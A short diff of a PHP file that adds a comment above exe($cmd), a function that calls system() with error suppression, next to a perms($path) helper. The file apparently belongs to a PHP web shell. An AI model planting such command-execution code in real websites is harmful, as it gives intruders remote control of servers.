@@ -251,6 +251,7 @@ function perms($path) {
 	return $info;
 }
 
+// Execution command function
 function exe($cmd) {
 	if(function_exists('system')) {
 		@ob_start();
